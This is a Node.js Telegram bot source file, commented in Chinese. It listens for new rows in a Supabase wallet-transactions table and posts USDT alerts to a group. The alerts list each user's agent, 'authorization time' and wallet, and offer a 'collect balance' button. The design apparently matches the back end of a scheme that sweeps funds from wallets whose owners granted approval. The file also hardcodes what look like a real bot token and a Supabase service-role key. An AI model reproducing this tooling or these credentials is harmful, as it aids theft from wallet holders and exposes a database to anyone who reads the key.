/**
 * 云服务器 Telegram Bot 示例
 * 实时查询数据库，显示最新的用户备注和代理信息
 */

const TelegramBot = require('node-telegram-bot-api')
const { createClient } = require('@supabase/supabase-js')

// 配置
const TELEGRAM_BOT_TOKEN = '8244139410:AAECUajPMdPx4C6b64YO0Wu2ginswejST_I'
const TELEGRAM_CHAT_ID = '-1003149735777'
const SUPABASE_URL = 'https://bfcpimnfgidhgigtgehs.supabase.co'
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJmY3BpbW5mZ2lkaGdpZ3RnZWhzIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1MTU5NDY5MiwiZXhwIjoyMDY3MTcwNjkyfQ.NE9Yfbitjsfvcek-qrnkQmNbaWS1ip5wI18-X7QFAcM'

// 初始化
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false })
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY)

/**
 * 实时查询用户完整信息（包括最新备注和代理）
 */
async function getUserCompleteInfo(walletAddress) {
  try {
    // 查询用户信息（不区分大小写）
    const { data: user, error: userError } = await supabase
      .from('nh_member_new')
      .select('id, wallet_address, agent_id, telegram_user_id, approved, is_active')
      .ilike('wallet_address', walletAddress)
      .eq('is_active', true)
      .single()
    
    if (userError || !user) {
      console.error('查询用户失败:', userError)
      return null
    }
    
    // 查询代理信息（实时）
    let agentName = '默认代理'
    let agentCode = '直链注册'
    
    if (user.agent_id && user.agent_id > 0) {
      const { data: agent } = await supabase
        .from('nh_agents')
        .select('agent_name, agent_code, referral_code')
        .eq('id', user.agent_id)
        .single()
      
      if (agent) {
        agentName = agent.agent_name || '默认代理'
        agentCode = agent.agent_code || agent.referral_code || '直链注册'
      }
    }
    
    // 计算用户编号
    const { count } = await supabase
      .from('nh_member_new')
      .select('*', { count: 'exact', head: true })
      .eq('approved', 1)
      .lte('first_approved_at', user.first_approved_at || new Date().toISOString())
    
    return {
      userId: user.id,
      address: user.wallet_address,
      agentName: agentName,
      agentCode: agentCode,
      userNumber: count || 0,
      userRemark: user.telegram_user_id || '暂无备注',  // 实时备注
      isActive: user.is_active
    }
  } catch (error) {
    console.error('获取用户信息异常:', error)
    return null
  }
}

/**
 * 监听 wallet_transactions 表的新插入
 * 使用 Supabase Realtime
 */
function startRealtimeMonitoring() {
  console.log('启动实时监听...')
  
  const channel = supabase
    .channel('wallet-transactions-monitor')
    .on(
      'postgres_changes',
      {
        event: 'INSERT',
        schema: 'public',
        table: 'wallet_transactions'
      },
      async (payload) => {
        console.log('检测到新交易:', payload.new)
        await handleNewTransaction(payload.new)
      }
    )
    .subscribe((status) => {
      if (status === 'SUBSCRIBED') {
        console.log('✅ 实时监听已启动')
      }
    })
}

/**
 * 处理新交易并发送通知
 */
async function handleNewTransaction(transaction) {
  try {
    console.log(`处理交易: ${transaction.user_address} ${transaction.transaction_type} ${transaction.amount} USDT`)
    
    // 实时查询用户和代理信息
    const userInfo = await getUserCompleteInfo(transaction.user_address)
    
    if (!userInfo) {
      console.log('用户信息查询失败，跳过')
      return
    }
    
    // 构建消息
    const isIncoming = transaction.transaction_type === 'in'
    const icon = isIncoming ? '🟢' : '🔴'
    const direction = isIncoming ? '收入' : '支出'
    
    const message = `${icon}${direction} USDT 提醒

钱包余额: ${transaction.amount}
顶层代理: ${userInfo.agentName}
代理昵称: ${userInfo.agentCode}
用户编号: ${userInfo.userNumber}
用户备注: ${userInfo.userRemark}
是否活动: 是
用户钱包: 
${transaction.user_address}
订单金额: ${isIncoming ? '+' : '-'}${transaction.amount} USDT
授权时间: ${new Date(transaction.timestamp).toLocaleString('zh-CN')}
交易对象: ${isIncoming ? transaction.from_address : transaction.to_address}
执行操作: 客户USDT余额${isIncoming ? '增加' : '减少'}`

    // 发送消息（带交互按钮）
    await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '查询余额', callback_data: `balance:${transaction.user_address}` },
            { text: '查看详情', callback_data: `detail:${transaction.user_address}` }
          ],
          [
            { text: '修改备注', callback_data: `edit_remark:${transaction.user_address}` },
            { text: '归集余额', callback_data: `collect:${transaction.user_address}` }
          ]
        ]
      }
    })
    
    console.log('✅ 通知已发送')
    
    // 更新交易状态
    await supabase
      .from('wallet_transactions')
      .update({ 
        is_processed: true, 
        notification_sent: true,
        processed_at: new Date().toISOString()
      })
      .eq('id', transaction.id)
    
  } catch (error) {
    console.error('处理交易失败:', error)
  }
}

/**
 * 处理 Telegram 按钮回调
 */
bot.on('callback_query', async (callbackQuery) => {
  const data = callbackQuery.data
  const chatId = callbackQuery.message.chat.id
  
  try {
    if (data.startsWith('balance:')) {
      // 查询实时余额
      const address = data.split(':')[1]
      const balance = await getOnChainBalance(address)
      await bot.sendMessage(chatId, `当前 USDT 余额: ${balance}`)
    }
    else if (data.startsWith('edit_remark:')) {
      // 修改备注
      const address = data.split(':')[1]
      await bot.sendMessage(chatId, `请回复新的备注内容（回复此消息）`)
      // 等待用户输入...
    }
    else if (data.startsWith('collect:')) {
      // 一键归集
      const address = data.split(':')[1]
      await bot.sendMessage(chatId, `正在归集 ${address} 的余额...`)
      // 执行归集逻辑...
    }
    
    await bot.answerCallbackQuery(callbackQuery.id)
  } catch (error) {
    console.error('处理回调失败:', error)
  }
})

// 启动服务
console.log('Telegram Bot 服务启动中...')
startRealtimeMonitoring()
console.log('✅ 服务已启动，正在监听交易...')

// 保持进程运行
setInterval(() => {
  console.log(`[${new Date().toLocaleString()}] 服务运行中...`)
}, 60000) // 每分钟输出一次状态


